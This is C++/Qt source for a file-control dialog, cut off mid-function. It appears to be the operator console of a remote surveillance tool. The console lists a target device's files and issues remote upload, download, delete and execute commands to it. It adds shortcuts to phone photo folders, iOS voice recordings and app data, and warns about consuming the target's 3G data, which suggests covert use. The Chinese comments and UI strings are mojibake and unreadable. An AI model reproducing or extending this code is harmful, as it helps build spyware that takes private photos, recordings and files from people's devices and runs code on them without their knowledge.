#include "filectrldlg.h"
#include "target.h"
#include "maindlg.h"

#include "nofocusstyle.h"
#include "DatabaseManager.h"
#include "Utility.h"
#include "TargetConnection.h"
#include "downloaddirdlg.h"
#include "getdirinfodlg.h"
#include "filemontypedlg.h"
#include "FavoriteParser.h"
#include "favoritenamedlg.h"

#define PLUGIN_ENABLE_1 0x00000001
#define PLUGIN_ENABLE_2 0x00000002
#define PLUGIN_ENABLE_3 0x00000004
#define PLUGIN_ENABLE_4 0x00000008

FileCtrlDlg::FileCtrlDlg(QWidget *parent, Target* tar)
	: QWidget(parent)
	, m_tar(tar)
	, bShowDiskList(true)
{
	ui.setupUi(this);

	InitConnection();
	InitWidgetAppearance();
	InitFileControl();

	// �����
	//ui.btnSearch->hide();
	//ui.btnMonitor->hide();

	ui.lbFileCtrl->hide();
	ui.frame_download_bar->hide();
	ui.btnGoto->hide();
	ui.btnFavorite->hide();
	ui.btnDelete->hide();
	ui.btnRun->hide();
	ui.btnAnalysis->hide();
	ui.btnMonitor->hide();
}

FileCtrlDlg::~FileCtrlDlg()
{

}

void FileCtrlDlg::InitConnection()
{
	// �Ҽ��˵�
	connect(ui.tbFileList, SIGNAL(customContextMenuRequested(QPoint)), this, SLOT(onTbFileListContextMenuActived(QPoint)));
	connect(ui.trFileCtrl, SIGNAL(customContextMenuRequested(QPoint)), this, SLOT(onTrFileCtrlContextMenuActived(QPoint)));

	// �����ļ��б��е�ĳһ��
	connect(ui.tbFileList, SIGNAL(itemClicked(QTableWidgetItem*)), this, SLOT(onTbFileListItemClick(QTableWidgetItem*)));

	// ˫���ļ��б��е�ĳһ��
	connect(ui.tbFileList, SIGNAL(itemDoubleClicked(QTableWidgetItem*)), this, SLOT(onTbFileListItemDoubleClicked(QTableWidgetItem*)));

	// ��������ļ������б���
	connect(ui.trFileCtrl, SIGNAL(itemClicked(QTreeWidgetItem*, int)), this, SLOT(onTrFileCtrlItemClick(QTreeWidgetItem*, int)));

	// ��ַ�������ı�
	connect(ui.cmbAddress, SIGNAL(activated(int)), this, SLOT(onAddressIndexChanged(int)));

	// ��ת��' ��ť
	connect(ui.btnGoto, SIGNAL(clicked()), this, SLOT(onBtnGotoClicked()));

	// �ղ�
	connect(ui.btnFavorite, SIGNAL(clicked()), this, SLOT(onBtnFavoriteClicked()));

	// �ϴ������ء�Ŀ¼���ء�Ŀ¼�б��ȡ
	connect(ui.btnUpload, SIGNAL(clicked()), this, SLOT(onBtnUploadClicked()));
	connect(ui.btnDownload, SIGNAL(clicked()), this, SLOT(onBtnDownloadClicked()));
	connect(ui.btnDownloadDir, SIGNAL(clicked()), this, SLOT(onBtnDownloadDirClicked()));
	connect(ui.btnGetDirList, SIGNAL(clicked()), this, SLOT(onBtnGetDirListClicked()));

	// ���ϡ�ˢ�¡�ɾ�������С����ܷ�������Ӽ���
	connect(ui.btnUp, SIGNAL(clicked()), this, SLOT(onBtnUpClicked()));
	connect(ui.btnRefresh, SIGNAL(clicked()), this, SLOT(onBtnRefreshClicked()));
	connect(ui.btnDelete, SIGNAL(clicked()), this, SLOT(onBtnDeleteClicked()));
	connect(ui.btnRun, SIGNAL(clicked()), this, SLOT(onBtnRunClicked()));
	connect(ui.btnAnalysis, SIGNAL(clicked()), this, SLOT(onBtnAnalyzeClicked()));
	connect(ui.btnMonitor, SIGNAL(clicked()), this, SLOT(onBtnMonitorClicked()));

	// ����
	connect(ui.btnSearch, SIGNAL(clicked()), this, SLOT(onBtnSearchClicked()));

	// ��ʼ����
	connect(ui.btnStartSearch, SIGNAL(clicked()), this, SLOT(onBtnStartSearchClicked()));

	// �������������ļ�
	connect(ui.btnStartDownload, SIGNAL(clicked()), this, SLOT(onBtnStartDownloadClicked()));

	// �����ļ��б�
	connect(ui.btnReturnFileList, SIGNAL(clicked()), this, SLOT(onBtnReturnFileListClicked()));
}

void FileCtrlDlg::InitWidgetAppearance()
{
	NoFocusStyle* nofocusStyle = new NoFocusStyle(this);

	// Windows �ⲻ֧��Զ������
	if ( UnixLike(m_tar) )
	{
		ui.btnRun->hide();
	}

	if ( UnixLike(m_tar) )
	{
		ui.chkTxt->hide();
	}

	// �޸��ļ��б��Ҽ��˵�����
	ui.tbFileList->setContextMenuPolicy(Qt::CustomContextMenu);
	ui.trFileCtrl->setContextMenuPolicy(Qt::CustomContextMenu);

	// �ļ��б�
	ui.trFileCtrl->setStyle(nofocusStyle);

	QFileIconProvider icon;
	ui.trFileCtrl->topLevelItem(0)->setIcon(0, QIcon(icon.icon(QFileIconProvider::Folder)));

	ui.tbFileList->setStyle(nofocusStyle);
	ui.tbFileList->horizontalHeader()->setDefaultAlignment(Qt::AlignLeft | Qt::AlignVCenter);
	ui.tbFileList->horizontalHeader()->resizeSection(0, 200);
	ui.tbFileList->horizontalHeader()->resizeSection(1, 150);
	ui.tbFileList->horizontalHeader()->resizeSection(2, 150);
	ui.tbFileList->horizontalHeader()->resizeSection(3, 100);
	ui.tbFileList->horizontalHeader()->resizeSection(4, 50);

	// ��������б�
	ui.tbSearchResult->setStyle(nofocusStyle);
	ui.tbSearchResult->horizontalHeader()->resizeSection(0, 200);
	ui.tbSearchResult->horizontalHeader()->resizeSection(1, 300);
	ui.tbSearchResult->horizontalHeader()->resizeSection(2, 100);
	ui.tbSearchResult->horizontalHeader()->resizeSection(3, 150);

	// �������ļ�����
	QRegExpValidator* fileTypeFilter = new QRegExpValidator(QRegExp("[^*]+"));
	ui.edtFileType->setValidator(fileTypeFilter);

	ui.dateTo->setDate(QDate::currentDate());
}

void FileCtrlDlg::InitFileControl()
{
	if ( SYSTEM_WINDOWS != m_tar->m_sysType )
	{
		ui.btnMonitor->hide();
	}

	ui.trFileCtrl->clear();

	InitShortcut();

	if ( UnixLike(m_tar) )
	{
		StartGetDirInfomation(std::wstring(L"/"), false);
	}
	else
	{
		UpdateLirInfo();
		//SendMessage(this->Handle, WM_UPDATE_SEARCHINFO, NULL, NULL);
	}
}

void FileCtrlDlg::InitShortcut()
{
	if ( UnixLike(m_tar) )
	{
		QFileIconProvider icon;
		AddShortcut(L"�ļ�ϵͳ", L"/", icon.icon(QFileIconProvider::Folder));
	}
	else
		AddShortcut(L"�����б�", L"", QIcon(QPixmap(":/image/allfile.png")));

	if ( SYSTEM_ANDROID == GetSystemType(m_tar->dwOsBuildNumber) )
	{
		QTreeWidgetItem* item = ui.trFileCtrl->topLevelItem(0);
		AddShortcut(L"����", L"/sdcard/Music", QIcon(QPixmap(":/image/music.png")), item);
		AddShortcut(L"��Ƭ", L"/sdcard/DCIM", QIcon(QPixmap(":/image/album.png")), item);
		AddShortcut(L"Ӧ�ó����б�", L"/data/app", QIcon(QPixmap(":/image/app.png")), item);
		AddShortcut(L"�洢��", L"/sdcard", QIcon(QPixmap(":/image/sdcard.png")), item);
	}
	else if ( SYSTEM_IOS == m_tar->m_sysType )
	{
		QTreeWidgetItem* item = ui.trFileCtrl->topLevelItem(0);
		AddShortcut(L"¼���ļ�", L"/private/var/mobile/Media/Recordings", QIcon(QPixmap(":/image/music.png")), item);
		AddShortcut(L"��Ƭ", L"/private/var/mobile/Media/DCIM", QIcon(QPixmap(":/image/album.png")), item);

		if ( m_tar->dwOsBuildNumber == IOS_VERSION_8)
			AddShortcut(L"Ӧ�ó����б�", L"/var/mobile/Containers/Data/Application", QIcon(QPixmap(":/image/app.png")), item);
		else
			AddShortcut(L"Ӧ�ó����б�", L"/private/var/mobile/Applications", QIcon(QPixmap(":/image/app.png")), item);
	}

	AddCustomShortcut();
}

void FileCtrlDlg::AddCustomShortcut()
{
	FavoriteParser localFavor;
	localFavor.Load(m_tar->widLocalDataDir + L"\\favorite.xml");

	const FavoriteParser::FavoriteList& favorList = localFavor.GetFavoriteList();

	if ( 0 == favorList.size() )
		return;

	QTreeWidgetItem* favorite = new QTreeWidgetItem;
	favorite->setText(0, QString::fromLocal8Bit("�ղؼ�"));
	favorite->setIcon(0, QIcon(QPixmap(":/image/star.png")));
	ui.trFileCtrl->addTopLevelItem(favorite);
	
	for ( FavoriteParser::FavoriteList::const_iterator it = favorList.begin();
		  it != favorList.end();
		  ++it )
	{
		QFileIconProvider icon;
		AddShortcut(it->name, it->path, icon.icon(QFileIconProvider::Folder), favorite);
		m_customShortMap[it->name] = it->path;
	}

	favorite->setExpanded(true);
}

void FileCtrlDlg::AddShortcut(std::wstring description, std::wstring path, QIcon& icon, QTreeWidgetItem* parent)
{
	QTreeWidgetItem* root = ui.trFileCtrl->topLevelItem(0);
	QTreeWidgetItem* item = new QTreeWidgetItem;
	item->setText(0, QString::fromStdWString(description));
	item->setData(0, Qt::UserRole, QString::fromStdWString(path));
	item->setIcon(0, icon);

	if ( parent )
	{
		parent->insertChild(0, item);
		parent->setExpanded(true);
	}
	else
		ui.trFileCtrl->addTopLevelItem(item);
}

void FileCtrlDlg::onTbFileListContextMenuActived(QPoint point)
{
	QMenu menu(this);

	QTableWidgetItem* item = ui.tbFileList->itemAt(point);

	if ( NULL == item )
		return;

	item = ui.tbFileList->item(item->row(), 0);
	PFILE_BLOCK fileInfo = (PFILE_BLOCK)item->data(Qt::UserRole).toUInt();
	QPoint realPos = ui.tbFileList->viewport()->mapToGlobal(point);

	if ( fileInfo )
	{
		std::wstring path;
		if ( UnixLike(m_tar) )
			path = PathMergeMac(this->curFilePathW, fileInfo->widName);
		else
			path = PathMergeW(this->curFilePathW, fileInfo->widName);

		UpdateItemMonitorStatus(path, item);

		if ( fileInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY )
		{
			// Ŀ¼�˵�

			QAction* monitorDir = NULL;

			if ( SYSTEM_WINDOWS == m_tar->m_sysType )
			{
				if ( IsMonitored(item) )
					monitorDir = menu.addAction(QString::fromLocal8Bit("ȡ����ش��ļ���"));
				else
					monitorDir = menu.addAction(QString::fromLocal8Bit("��ش��ļ���"));
			}

			QAction* addToFavorite = menu.addAction(QString::fromLocal8Bit("�ղش��ļ���"));
			QAction* getDirInfo = menu.addAction(QString::fromLocal8Bit("Ŀ¼��Ϣ��ȡ"));
			QAction* searchDir = menu.addAction(QString::fromLocal8Bit("�ڴ��ļ���������"));
			QAction* upload = menu.addAction(QString::fromLocal8Bit("�ϴ��ļ�����Ŀ¼"));
			QAction* downloadDir = menu.addAction(QString::fromLocal8Bit("���ش�Ŀ¼"));
			QAction* result  = menu.exec(realPos);

			if ( NULL == result )
				return;

			if ( result == monitorDir )
				onBtnMonitorClicked();

			if ( result == addToFavorite )
				AddFavorite(path);


			if ( result == getDirInfo )
				onBtnGetDirListClicked();

			if ( result == searchDir )
			{
				ui.stkFileCtrl->setCurrentIndex(1);
				ui.edtSearchPath->clear();
				if ( path != L"�����б�" )
					ui.edtSearchPath->setText(QString::fromStdWString(path));
			}

			if ( result == upload )
				UploadFile(path);

			if ( result == downloadDir )
				onBtnDownloadDirClicked();
		}
		else
		{
			// �ļ��˵�
			QAction* downloadFile = menu.addAction(QString::fromLocal8Bit("���ش��ļ�"));
			QAction* deleteFile = menu.addAction(QString::fromLocal8Bit("ɾ�����ļ�"));

			QAction* monitorFile = NULL;

			if ( SYSTEM_WINDOWS == m_tar->m_sysType )
			{
				if ( IsMonitored(item) )
					monitorFile = menu.addAction(QString::fromLocal8Bit("ȡ����ش��ļ�"));
				else
					monitorFile = menu.addAction(QString::fromLocal8Bit("��ش��ļ�"));
			}

			QAction* execFile = NULL;

			if ( SYSTEM_WINDOWS == m_tar->m_sysType )
			{
				if ( path.length() > 3 )
				{
					int pos = path.rfind(L'.');

					std::wstring ext;
					if ( pos != std::wstring::npos )
						ext = path.substr(pos, path.length()-pos);

					if ( ext == L".exe" || ext == L".EXE" )
						execFile = menu.addAction(QString::fromLocal8Bit("���д��ļ�"));
				}
			}

			QAction* result  = menu.exec(realPos);

			if ( NULL == result )
				return;

			if ( result == execFile )
				onBtnRunClicked();

			if ( result == downloadFile )
				onBtnDownloadClicked();
			if ( result == deleteFile )
				onBtnDeleteClicked();
			if ( result == monitorFile )
				onBtnMonitorClicked();
		}
	}
}

void FileCtrlDlg::onTrFileCtrlContextMenuActived(QPoint point)
{
	QTreeWidgetItem* item = ui.trFileCtrl->itemAt(point);

	if ( item == NULL 
		|| item->parent() == NULL
		|| item->parent()->text(0).toStdWString() != L"�ղؼ�" )
		return;

	QMenu favoriteMenu(this);

	QAction* removeShortcut = favoriteMenu.addAction(QString::fromLocal8Bit("ɾ��"));
	QPoint realPos = ui.trFileCtrl->viewport()->mapToGlobal(point);

	if ( removeShortcut == favoriteMenu.exec(realPos) )
	{
		FavoriteParser localFavor;
		localFavor.Load(m_tar->widLocalDataDir + L"\\favorite.xml");
		localFavor.RemoveFavorite(item->text(0).toStdWString());

		m_customShortMap.erase(m_customShortMap.find(item->text(0).toStdWString()));
		QTreeWidgetItem* favorite = item->parent();
		favorite->takeChild(favorite->indexOfChild(item));

		if ( favorite->childCount() == 0 )
			ui.trFileCtrl->takeTopLevelItem(ui.trFileCtrl->indexOfTopLevelItem(favorite));
	}
}

void FileCtrlDlg::UpdateItemMonitorStatus(const std::wstring& path, QTableWidgetItem* item)
{
	item = ui.tbFileList->item(item->row(), 1);

	bool monitored = DM->QueryFileItemMonitored(m_tar->dwTargetID, path);

	SetItemMonitorFlag(monitored);
}

void FileCtrlDlg::onTbFileListItemClick(QTableWidgetItem* item)
{
	QTableWidgetItem* curItem = ui.tbFileList->item(item->row(), 0);

	//
	// ѡ�е� item ��Ŀ¼�����ļ������˰�ť�Ŀ���״̬
	//


	PFILE_BLOCK fileBlock = (PFILE_BLOCK)curItem->data(Qt::UserRole).toUInt();
	if ( NULL == fileBlock || fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY )
	{
		ui.btnDelete->setEnabled(false);
		//ui.btnUpload->setEnabled(true);
		ui.btnDownload->setEnabled(false);
		ui.btnDownloadDir->setEnabled(true);
		ui.btnGetDirList->setEnabled(true);
		ui.btnRun->setEnabled(false);
	}
	else
	{
		ui.btnDownload->setEnabled(true);
		ui.btnDownloadDir->setEnabled(false);
		ui.btnGetDirList->setEnabled(false);
		ui.btnDelete->setEnabled(true);
		ui.btnRun->setEnabled(true);

		// ��ֹɾ��Ŀ¼
		for (int i = 0; i < ui.tbFileList->selectedItems().count(); i++)
		{
			QTableWidgetItem* _curItem = ui.tbFileList->selectedItems().at(i);
			_curItem = ui.tbFileList->item(_curItem->row(), 0);
			PFILE_BLOCK fileBlock = (PFILE_BLOCK)_curItem->data(Qt::UserRole).toUInt();
			if ( NULL == fileBlock || fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY )
			{
				ui.btnDelete->setEnabled(false);
			}
		}

		// ��ֹ���ش�СΪ 0 ���ļ�
		if ( 0 == fileBlock->Size )
		{
			ui.btnDownload->setEnabled(false);
		}
	}

	if ( fileBlock != NULL )
	{
		std::wstring path;
		if ( UnixLike(m_tar) )
			path = PathMergeMac(this->curFilePathW, fileBlock->widName);
		else
			path = PathMergeW(this->curFilePathW, fileBlock->widName);

		UpdateItemMonitorStatus(path, item);

		if ( IsMonitored(item) )
		{
			ui.btnMonitor->setToolTip(QString::fromLocal8Bit("ȡ������"));
			ui.btnMonitor->setIcon(QIcon(QPixmap(":/image/cancelmonitor.png")));
		}
		else
		{
			ui.btnMonitor->setToolTip(QString::fromLocal8Bit("��Ӽ���"));
			ui.btnMonitor->setIcon(QIcon(QPixmap(":/image/monitor.png")));
		}
	}
}

void FileCtrlDlg::onTbFileListItemDoubleClicked(QTableWidgetItem* item)
{
	QTableWidgetItem* curItem = ui.tbFileList->item(item->row(), 0);
	PFILE_BLOCK fileBlock = (PFILE_BLOCK)curItem->data(Qt::UserRole).toUInt();
	if (fileBlock == NULL)
	{
		// �����б�
		//
		StartGetDirInfomation(curItem->text().toStdWString(), false);
	}
	else
	{
		//
		// �����Ŀ¼�����г�Ŀ¼�µ��ļ�
		// ������ļ���������ڱ���Ŀ¼
		//
		if (fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			std::wstring filePath;

			if (UnixLike(m_tar))
			{
				filePath = PathMergeMac(curFilePathW, curItem->text().toStdWString());
			}
			else
			{
				filePath = PathMergeW(curFilePathW, curItem->text().toStdWString());
			}

			StartGetDirInfomation(filePath, false);
		}
		else
		{
			if (fileBlock->bDowned)
			{
				std::wstring localPath = GenerateLocalFileSavedPath(
					this->m_tar->widLocalDataDir, curFilePathW, UnixLike(m_tar));
				ShellExecuteW(NULL, L"explore", localPath.c_str(), NULL, NULL, SW_SHOW);
			}
		}
	}
}

void FileCtrlDlg::onTrFileCtrlItemClick(QTreeWidgetItem* item, int column)
{
	std::wstring path;
	ui.stkFileCtrl->setCurrentIndex(0);
	
	path = item->data(0, Qt::UserRole).toString().toStdWString();

	if ( path.empty() )
		return;

	StartGetDirInfomation(path, false);
}

void FileCtrlDlg::onAddressIndexChanged(int index)
{
	this->curFilePathW = ui.cmbAddress->currentText().toStdWString();
	StartGetDirInfomation(ui.cmbAddress->currentText().toStdWString(), false);
}

void FileCtrlDlg::onBtnGotoClicked()
{
	StartGetDirInfomation(ui.cmbAddress->currentText().toStdWString(), false);
}

void FileCtrlDlg::onBtnFavoriteClicked()
{
	std::wstring path = ui.cmbAddress->currentText().toStdWString();

	AddFavorite(path);
}

void FileCtrlDlg::AddFavorite(std::wstring path)
{
	std::wstring name;
	if ( UnixLike(m_tar) )
		name = GetNameFromPath(path, L'/');
	else
		name = GetNameFromPath(path, L'\\');

	FavoriteNameDlg dlg(name);

	if ( QDialog::Accepted == dlg.exec() )
	{
		std::wstring name = dlg.GetFavoriteName();

		if ( m_customShortMap.end() != m_customShortMap.find(name) )
			return;

		QTreeWidgetItem* favorite = GetParentItem(ui.trFileCtrl, L"�ղؼ�");

		if ( NULL == favorite )
		{
			favorite = new QTreeWidgetItem;
			favorite->setText(0, QString::fromLocal8Bit("�ղؼ�"));
			favorite->setIcon(0, QIcon(QPixmap(":/image/star.png")));
			ui.trFileCtrl->addTopLevelItem(favorite);
		}

		QFileIconProvider icon;
		AddShortcut(name, path, icon.icon(QFileIconProvider::Folder), favorite);
		m_customShortMap[name] = path;

		FavoriteParser localFavor;
		localFavor.Load(m_tar->widLocalDataDir + L"\\favorite.xml");
		localFavor.AddFavorite(name, path);
	}
}

void FileCtrlDlg::onBtnUploadClicked()
{
	UploadFile(curFilePathW);
}

void FileCtrlDlg::UploadFile(std::wstring dirPath)
{
	if (FrmMain->ctrOnlineFlag == false)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("����״̬�²��������ļ��ϴ�����!"));
		return;
	}

	if ( MobileDevice(m_tar)
		&& 2 == m_tar->m_netEnv )
	{
		DWORD plginEnable = DM->QueryTargetPluginStatus(m_tar->dwTargetID);
		if ( ! (plginEnable & PLUGIN_ENABLE_1) )
		{
			if ( IDCANCEL == MessageBoxW(
				(HWND)this->winId(), 
				L"��ǰ�豸����ʹ�� 3G ���磬�ϴ��ļ�������һ��������.\r\nȷ��Ҫǿ���ϴ���?",
				L"��ʾ",
				MB_OKCANCEL | MB_ICONINFORMATION) )
				return;
		}
	}

	QString tarfileName = QFileDialog::getOpenFileName();

	if ( tarfileName.isEmpty() )
		return;
	
	tarfileName.replace("/", "\\");

	std::wstring ctrPathW = tarfileName.toStdWString();
	std::wstring tarPathW = dirPath;

	unsigned int pos = ctrPathW.rfind(L'\\');
	std::wstring fileName = ctrPathW.substr(pos+1, -1);

	HANDLE hFile = CreateFileW(ctrPathW.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD fileSize = GetFileSize(hFile, NULL);
	if ( 0 == fileSize )
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("�����ϴ����ļ�!"));
		CloseHandle(hFile);
		return;
	}

	CloseHandle(hFile);

	std::wstring tarFileW;
	if ( UnixLike(m_tar) )
	{
		tarFileW = PathMergeMac(tarPathW, fileName);
	}
	else
	{
		tarFileW = PathMergeW(tarPathW, fileName);
	}

	WCHAR tips[1024] = {0};
	wsprintfW(tips, L"ȷ��Ҫ�ϴ� %s ��Ŀ¼ %s ����?", fileName.c_str(), tarPathW.c_str());

	if ( QMessageBox::Cancel == QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromStdWString(std::wstring(tips)),
			QMessageBox::Ok | QMessageBox::Cancel
			))
		return;

	SetTarStatusInfoExW(STATUS_INFO, m_tar,
		L"������� : �ϴ� \"%s\" �� \"%s\"", fileName.c_str(), tarPathW.c_str());

	if (this->m_tar->tarConn)
	{
		this->m_tar->tarConn->Send_AFT(m_tar->dwTargetID,
			FILEUP,
			GetBase64FromWide(ctrPathW).c_str(),
			GetBase64FromWide(tarFileW).c_str(),
			fileSize);
	}
}

void FileCtrlDlg::onBtnDownloadClicked()
{
	DownloadFile(curFilePathW);
}

void FileCtrlDlg::DownloadFile(std::wstring path)
{
	if (FrmMain->ctrOnlineFlag == false)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("����״̬�²��������ļ���������!"));
		return;
	}

	QList<QTableWidgetItem*> itemList = ui.tbFileList->selectedItems();

	if ( 0 == itemList.count())
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("�����ļ��б���ѡ��һ�������ļ���������!"));
		return;        
	}

	if ( MobileDevice(m_tar)
		&& 2 == m_tar->m_netEnv )
	{
		DWORD plginEnable = DM->QueryTargetPluginStatus(m_tar->dwTargetID);
		if ( ! (plginEnable & PLUGIN_ENABLE_1) )
		{
			if ( IDCANCEL == MessageBoxW(
				(HWND)this->winId(), 
				L"��ǰ�豸����ʹ�� 3G ���磬�����ļ�������һ��������.\r\nȷ��Ҫǿ��������?",
				L"��ʾ",
				MB_OKCANCEL | MB_ICONINFORMATION) )
				return;
		}
	}

	for (int i = 0; i < itemList.count(); i++)
	{
		QTableWidgetItem* curItem = itemList.at(i);

		// ���ݱ����ڵ�һ����
		if ( 0 != curItem->column() )
		{
			continue;
		}

		PFILE_BLOCK fileBlock = (PFILE_BLOCK)curItem->data(Qt::UserRole).toUInt();

		// .. ˵�����ƶ�ʹ���Զ�·�� [����Ĭ���Ǵ洢�ڱ�������Ŀ¼��]
		//
		std::wstring ctrPathW = L"..";

		// Ŀ��·�����������м�Դ·��
		//
		std::wstring tarPathW;
		if ( UnixLike(m_tar) )
		{
			tarPathW = PathMergeMac(path, curItem->text().toStdWString());
		}
		else
		{
			tarPathW = PathMergeW(path, curItem->text().toStdWString());
		}

		// @@@ ����Ƿ��Ѿ����������б�����
		//
		if (this->m_tar->tarConn)
		{
			SetTarStatusInfoExW(STATUS_INFO, this->m_tar, 
				L"������� : ���� \"%s\"", tarPathW.c_str());
			this->m_tar->tarConn->Send_AFT(m_tar->dwTargetID,
				FILEDOWN,
				GetBase64FromWide(ctrPathW).c_str(),
				GetBase64FromWide(tarPathW).c_str(),
				(ULONG)fileBlock->Size);
		}
	}
}

void FileCtrlDlg::onBtnDownloadDirClicked()
{
	if (FrmMain->ctrOnlineFlag == false)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("����״̬�²�������\"Ŀ¼����\"����!"));
		return;
	}

	std::wstring dir;

	if ( 0 == ui.tbFileList->selectedItems().count() )
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("��ѡ��һ��Ŀ¼!"));
		return;
	}

	QTableWidgetItem* item = ui.tbFileList->selectedItems().at(0);
	QTableWidgetItem* curItem = ui.tbFileList->item(item->row(), 0);

	if ( !this->bShowDiskList )
	{
		if ( UnixLike(m_tar) )
		{
			dir = PathMergeMac(this->curFilePathW, curItem->text().toStdWString());
		}
		else
		{
			dir = PathMergeW(this->curFilePathW, curItem->text().toStdWString());
		}

	}
	else
	{
		dir = curItem->text().toStdWString();
	}

	DownloadDirDlg dlg(this, QString::fromStdWString(dir));

	if ( QDialog::Accepted == dlg.exec() )
	{
		int nLevel = dlg.GetLevel();

		if (this->m_tar->tarConn)
		{
			this->m_tar->tarConn->Send_ADT(
				this->m_tar->dwTargetID,
				FILEDOWN,
				GetBase64FromWide(dir).c_str(),
				nLevel,
				1);
		}         
	}
}

void FileCtrlDlg::onBtnGetDirListClicked()
{
	if (FrmMain->ctrOnlineFlag == false)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("����״̬�²�������\"Ŀ¼��Ϣ��ȡ\"����!!"));
		return;
	}

	QList<QTableWidgetItem*> itemList = ui.tbFileList->selectedItems();

	if ( 0 != itemList.count() )
	{
		QTableWidgetItem* item = itemList.at(0);
		QTableWidgetItem* curItem = ui.tbFileList->item(item->row(), 0);

		if (this->bShowDiskList)
		{
			StartGetASyncDirInfo(curItem->text().toStdWString());
		}
		else
		{
			std::wstring wPath;

			if ( UnixLike(m_tar) )
			{
				wPath = PathMergeMac(this->curFilePathW, curItem->text().toStdWString());
			}
			else
			{
				wPath = PathMergeW(this->curFilePathW, curItem->text().toStdWString());
			}

			StartGetASyncDirInfo(wPath);
		}
	}
	else
	{
		//if ( ! this->bShowDiskList)
		//{
			//StartGetASyncDirInfo(this->curFilePathW);
			StartGetASyncDirInfo(ui.cmbAddress->currentText().toStdWString());
		//}
	}
}

void FileCtrlDlg::onBtnUpClicked()
{
	if (this->bShowDiskList)
	{
		return;    
	}

	std::wstring wpath = this->curFilePathW.c_str();

	unsigned int pos;

	if ( UnixLike(m_tar) )
	{
		pos = wpath.rfind(L"/");
	}
	else
	{
		pos = wpath.rfind(L"\\");
	}

	if (std::wstring::npos == pos)
	{
		return;
	}

	if (pos == wpath.size() - 1)
	{
		pos = wpath.rfind(UnixLike(m_tar) ? L"/" : L"\\", wpath.size() - 2);
		if (std::wstring::npos == pos)
		{
			// ������������C:\\
			//
			if (this->curFilePathW.length() == 3)
			{
				ShowDiskLogicDriver();
			}

			return;
		}
	}

	wpath = wpath.substr(0, pos);

	// mac ��Ŀ¼
	if ( wpath.length() == 0 )
	{
		wpath = L"/";
	}

	// windows �̷�
	if ( wpath.length() == 2 )
	{
		wpath += L"\\";
	}

	StartGetDirInfomation(wpath.c_str(), false);   
}

void FileCtrlDlg::onBtnRefreshClicked()
{
	if (FrmMain->ctrOnlineFlag == false)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("����״̬�²���ˢ��Ŀ¼!"));
		return;
	}

	if (this->m_tar->tarStatus == TARONLINE)
	{
		if (this->bShowDiskList && !UnixLike(m_tar))
		{
			FrmMain->ctrConn->Send_LIR(m_tar->dwTargetID);
		}
		else
		{
			if ( "" != ui.cmbAddress->currentText() )
			{
				StartGetOnlineDirInfo(ui.cmbAddress->currentText().toStdWString());     
			}   
		}
	}
	else
	{
		if (this->bShowDiskList)
		{
			QMessageBox::information(
				this,
				QString::fromLocal8Bit("��ʾ"),
				QString::fromLocal8Bit("Ŀ������ʱ���Զ�ˢ�´����б�"));
		}
		else
		{
			if(IDYES == MessageBoxA((HWND)this->winId(), "Ŀ�겻����, �޷����߻�ȡĿ¼��Ϣ!\r\n\r\n�Ƿ�����첽Ŀ¼��Ϣ��ȡ?", "��ʾ", MB_ICONQUESTION | MB_YESNO))
			{
				StartGetASyncDirInfo(ui.cmbAddress->currentText().toStdWString());
			}
		}
	}
}

void FileCtrlDlg::onBtnDeleteClicked()
{
	if (FrmMain->ctrOnlineFlag == false)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("����״̬�²����´��ļ�ɾ��ָ��"));
		return;
	}

	if (this->bShowDiskList)
	{
		return;
	}

	if (FrmMain->ctrConn)
	{
		QList<QTableWidgetItem*> selectedItems = ui.tbFileList->selectedItems();

		if (IDYES == MsgBoxExW((HWND)this->winId(), MB_YESNO | MB_ICONQUESTION, L"��ʾ", L"�Ƿ�Զ��ɾ��ѡ�е��ļ�?"))
		{
			QTableWidgetItem* item = selectedItems.at(0);
			item = ui.tbFileList->item(item->row(), 0);
			PFILE_BLOCK fileBlock = (PFILE_BLOCK)item->data(Qt::UserRole).toUInt();
			std::wstring wPath; 
			wPath = UnixLike(m_tar) ? PathMergeMac(curFilePathW, item->text().toStdWString())
				: PathMergeW(curFilePathW, item->text().toStdWString());

			FrmMain->ctrConn->Send_FDL(m_tar->dwTargetID,
				GetBase64FromWide(wPath).c_str());

			SetTarStatusInfoExW(STATUS_INFO, this->m_tar, L"[Ŀ��%s(ID:%u)] Զ��ɾ���ļ�\"%s\". ���Ժ�!",
				this->m_tar->widTargetName.c_str(),
				this->m_tar->dwTargetID,
				curFilePathW.c_str());
		}
	}
}

void FileCtrlDlg::onBtnRunClicked()
{
	if (FrmMain->ctrOnlineFlag == false)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("����״̬�²����´��ļ�ִ��ָ��!"));
		return;
	}

	if (FrmMain->ctrConn == NULL)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("�쳣�����������ӶϿ�!"));
		return;
	}

	std::wstring wPath = L"";

	if ( 0 == ui.tbFileList->selectedItems().count() )
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("��ѡ��һ���ļ�!"));
		return;
	}

	QTableWidgetItem* item = ui.tbFileList->selectedItems().at(0);
	item = ui.tbFileList->item(item->row(), 0);

